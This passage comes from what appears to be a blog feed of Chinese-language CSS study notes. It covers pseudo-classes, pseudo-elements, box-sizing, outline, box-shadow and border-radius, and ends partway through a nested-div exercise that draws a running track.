class="selector-tag">li</span><span class="selector-pseudo">:last-child</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: orange;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>:link</code>  未访问的链接</p></li><li><p><code>:visited</code>  已访问的链接</p></li><li><ul><li>由于隐私的原因，所以 <code>visited</code>  这个伪类只能修改链接的颜色</li></ul></li><li><p><code>:hover</code>  鼠标悬停的链接</p></li><li><p><code>:active</code>  鼠标点击的链接</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* unvisited link */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:link</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* visited link */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:visited</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: yellow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* mouse over link */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: green;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* selected link */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:active</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="https://www.yuque.com/api/filetransfer/images?url=https%3A%2F%2Fgitee.com%2Fvectorx%2FImageCloud%2Fraw%2Fmaster%2Fhtml5%2F20210517204218.png&amp;sign=00c7528db9f890d284638f404b92e92d797ded65c47b50144fc094422b5d02a2" alt="img"></p><h2 id="7-伪元素选择器"><a class="markdownIt-Anchor" href="#7-伪元素选择器">#</a> 7. 伪元素选择器</h2><p>伪元素，表示页面中一些特殊的并不真实的存在的元素（特殊的位置）</p><p>伪元素使用 <code>::</code>  开头</p><ul><li><p><code>::first-letter</code>  表示第一个字母</p></li><li><p><code>::first-line</code>  表示第一行</p></li><li><p><code>::selection</code>  表示选中的内容</p></li><li><p><code>::before</code>  元素的开始</p></li><li><p><code>::after</code>  元素的最后</p></li><li><p><code>::before</code>  和 <code>::after</code>  必须结合 <code>content</code>  属性来使用</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 段落首字母设置大小为30px */</span></span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">::first-letter</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 段落第一行设置为黄色背景 */</span></span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">::first-line</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 段落选中的部分变绿色 */</span></span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">::selection</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: green；</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* div前加上内容 */</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-pseudo">::before</span>&#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27;BEFORE&#x27;</span>;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* div后加上内容 */</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27;AFTER&#x27;</span>;</span><br><span class="line">    <span class="attribute">color</span>: blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="D:%5C%E8%BD%AF%E4%BB%B6%5Cf97e64a5-4af4-441b-b315-3fb19ff39457.gif" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;笔记来源：&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMVhKNDExWDdVZA==&quot;&gt;尚硅谷 Web 前端 HTML5&amp;amp;CSS3 初学者零基础入门全套完整版</summary>
      
    
    
    
    <category term="web前端" scheme="https://sun-spots.github.io/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>CSS圆角、阴影、轮廓</title>
    <link href="https://sun-spots.github.io/2022/01/13/%E4%BF%AE%E6%94%B9/%E7%9B%92%E6%A8%A1%E5%9E%8B%E8%A1%A5%E5%85%85/"/>
    <id>https://sun-spots.github.io/2022/01/13/%E4%BF%AE%E6%94%B9/%E7%9B%92%E6%A8%A1%E5%9E%8B%E8%A1%A5%E5%85%85/</id>
    <published>2022-01-13T11:59:12.000Z</published>
    <updated>2022-01-18T15:59:43.827Z</updated>
    
    <content type="html"><![CDATA[<h1 id="盒模型补充"><a class="markdownIt-Anchor" href="#盒模型补充">#</a> 盒模型补充</h1><p>笔记来源：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMVhKNDExWDdVZA==">尚硅谷 Web 前端 HTML5&amp;CSS3 初学者零基础入门全套完整版</span></p><h2 id="1-盒子大小"><a class="markdownIt-Anchor" href="#1-盒子大小">#</a> 1. 盒子大小</h2><p>默认情况下，盒子可见框的大小由内容区、内边距和边框共同决定</p><p><code>box-sizing</code>  用来设置盒子尺寸的计算方式（设置 width 和 height 的作用）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">10px</span> red solid;</span><br><span class="line">    <span class="comment">/* box-sizing: content-box; */</span></span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可选值：</p><ul><li><p><code>content-box</code>  默认值，宽度和高度用来设置<strong>内容区</strong>的大小<br><img data-src="https://s3.bmp.ovh/imgs/2022/01/b5948be605e74d19.png" alt=""></p></li><li><p><code>border-box</code>  宽度和高度用来设置<strong>整个盒子</strong>可见框的大小 **（ <code>width</code>  和 <code>height</code>  指的是内容区、内边距和边框的总大小）**</p></li></ul><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/da81441fecd3130a.png" alt=""></p><h2 id="2-轮廓"><a class="markdownIt-Anchor" href="#2-轮廓">#</a> 2. 轮廓</h2><p><code>outline</code>  用来设置元素的轮廓线，用法和 <code>border</code>  一模一样</p><p>轮廓和边框不同点是，轮廓不会影响到可见框的大小</p><p><strong>边框</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">10px</span> red solid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/vectorx/ImageCloud/raw/master/html5/20210523193430.png" alt="img"></p><p><strong>轮廓</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">    <span class="attribute">outline</span>: <span class="number">10px</span> red solid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/vectorx/ImageCloud/raw/master/html5/20210523193328.png" alt="img"></p><p>可以很明显看到 <code>outline</code>  与 <code>border</code>  的区别</p><p>我们一般不会直接这么设置轮廓，而是下面这种场景</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">outline</span>: <span class="number">10px</span> red solid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/vectorx/ImageCloud/raw/master/html5/20210523193733.gif" alt="img"></p><p>从上面的动态图也可以很清晰地看出， <code>outline</code>  属性并没有改变盒子的布局</p><h2 id="3-阴影"><a class="markdownIt-Anchor" href="#3-阴影">#</a> 3. 阴影</h2><p><code>box-shadow</code>  属性用于在一个元素的框架周围添加阴影效果</p><p>你可以设置多个由逗号分隔的效果</p><p>一个盒状阴影由相对于元素的 X 和 Y 的偏移量、模糊和扩散半径以及颜色来描述</p><p><code>box-shadow</code>  用来设置元素的阴影效果，阴影不会影响页面布局</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">10px</span> <span class="number">10px</span> orange;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/vectorx/ImageCloud/raw/master/html5/20210523200020.png" alt="img"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">box-shadow</span>: <span class="number">10px</span> <span class="number">10px</span> <span class="number">5px</span> orange;</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/vectorx/ImageCloud/raw/master/html5/20210523200056.png" alt="img"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">box-shadow</span>: <span class="number">10px</span> <span class="number">10px</span> <span class="number">5px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/vectorx/ImageCloud/raw/master/html5/20210523201711.png" alt="img"></p><ul><li><p>第一个值 - 水平偏移量：设置阴影的水平位置</p></li><li><ul><li>正值向右移动</li></ul></li><li><ul><li>负值向左移动</li></ul></li><li><p>第二个值 - 垂直偏移量：设置阴影的垂直位置</p></li><li><ul><li>正值向下移动</li></ul></li><li><ul><li>负值向上移动</li></ul></li><li><p>第三个值 - 阴影的模糊半径</p></li><li><p>第四个值 - 阴影的颜色</p></li></ul><h2 id="4-圆角"><a class="markdownIt-Anchor" href="#4-圆角">#</a> 4. 圆角</h2><p><code>border-radius</code>  属性使一个元素的外边框边缘的角变圆</p><p>你可以设置一个半径来做圆角，或者设置两个半径来做椭圆角</p><p><code>border-radius</code>  用来设置圆角，圆角设置的是圆的半径大小</p><ul><li><p><code>border-top-left-radius</code></p></li><li><p><code>border-top-right-radius</code></p></li><li><p><code>border-bottom-left-radius</code></p></li><li><p><code>border-bottom-right-radius</code></p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">border-radius</span>: <span class="number">20px</span>;</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/vectorx/ImageCloud/raw/master/html5/20210523200800.png" alt="img"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">border-top-right-radius</span>: <span class="number">50px</span> <span class="number">100px</span>;</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/vectorx/ImageCloud/raw/master/html5/20210523201043.png" alt="img"></p><p><code>border-radius</code>  可以分别指定四个角的圆角</p><ul><li><p>四个值： <code>左上</code>    <code>右上</code>    <code>右下</code>    <code>左下</code></p></li><li><p>三个值： <code>左上</code>    <code>右上/左下</code>    <code>右下</code></p></li><li><p>两个值： <code>左上/右下</code>    <code>右上/左下</code></p></li><li><p>一个值： <code>左上/右上/右下/左下</code></p></li></ul><p>这里同样不需要死记硬背，只要记住遵循顺时针方向和矩形中心点对称原则</p><p>与 <code>border</code>  不同的是， <code>border</code>  是从 <code>上</code> 开始顺时针设置，而圆角是从 <code>左上</code> 开始</p><h3 id="圆"><a class="markdownIt-Anchor" href="#圆">#</a> 圆</h3><p>原理很简单，就是绘制正方形，并将四个圆角半径设置为正方形的一半</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/vectorx/ImageCloud/raw/master/html5/20210523201707.png" alt="img"></p><h3 id="椭圆"><a class="markdownIt-Anchor" href="#椭圆">#</a> 椭圆</h3><p>只需要对上述样式对一点点的改动，设置 <code>width</code>  和 <code>height</code>  属性不相等即可</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/vectorx/ImageCloud/raw/master/html5/20210523202032.png" alt="img"></p><h2 id="5-田径场实战"><a class="markdownIt-Anchor" href="#5-田径场实战">#</a> 5. 田径场实战</h2><p>html 代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box2&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box4&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box5&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box6&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box7&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box8&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;boxRect&quot;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;boxCirc&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;boxRectLeft1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;boxRectRight1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>css 样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box1</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#DA251E</span>;</span><br><span class="line">    <span class="comment">/* 这里使用css的一个表达式，方便加减乘除计算 */</span></span><br><span class="line">    <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">1719.2px</span>/<span class="number">2</span> + <span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">0</span>*<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">0</span>*<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">100px</span> auto;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">0.5px</span> white solid;</span><br><span class="line">    <span class="comment">/* 圆角 */</span></span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="built_in">calc</span>(<span class="number">360px</span> - <span class="number">12.2px</span>*<span class="number">0</span>) / <span class="number">50%</span>;</span><br><span class="line">    <span class="comment">/* 盒子 */</span></span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box2</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">1719.2px</span>/<span class="number">2</span> + <span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">1</span>*<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">1</span>*<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">12.2px</span> auto;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">0.5px</span> white solid;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="built_in">calc</span>(<span class="number">360px</span> - <span class="number">12.2px</span>*<span class="number">1</span>) / <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box3</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">1719.2px</span>/<span class="number">2</span> + <span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">2</span>*<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">2</span>*<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">12.2px</span> auto;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">0.5px</span> white solid;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="built_in">calc</span>(<span class="number">360px</span> - <span class="number">12.2px</span>*<span class="number">2</span>) / <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box4</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">1719.2px</span>/<span class="number">2</span> + <span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">3</span>*<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">3</span>*<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">12.2px</span> auto;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">0.5px</span> white solid;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="built_in">calc</span>(<span class="number">360px</span> - <span class="number">12.2px</span>*<span class="number">3</span>) / <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box5</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">1719.2px</span>/<span class="number">2</span> + <span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">4</span>*<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">4</span>*<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">12.2px</span> auto;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">0.5px</span> white solid;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="built_in">calc</span>(<span class="number">360px</span> - <span class="number">12.2px</span>*<span class="number">4</span>) / <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box6</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">1719.2px</span>/<span class="number">2</span> + <span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">5</span>*<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">5</span>*<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">12.2px</span> auto;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">0.5px</span> white solid;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="built_in">calc</span>(<span class="number">360px</span> - <span class="number">12.2px</span>*<span class="number">5</span>) / <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box7</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">1719.2px</span>/<span class="number">2</span> + <span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">6</span>*<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">6</span>*<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">12.2px</span> auto;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">0.5px</span> white solid;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="built_in">calc</span>(<span class="number">360px</span> - <span class="number">12.2px</span>*<span class="number">6</span>) / <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box8</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#00923F</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">1719.2px</span>/<span class="number">2</span> + <span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">7</span>*<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">7</span>*<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">12.2px</span> auto;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">0.5px</span> white solid;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="built_in">calc</span>(<span class="number">360px</span> - <span class="number">12.2px</span>*<span 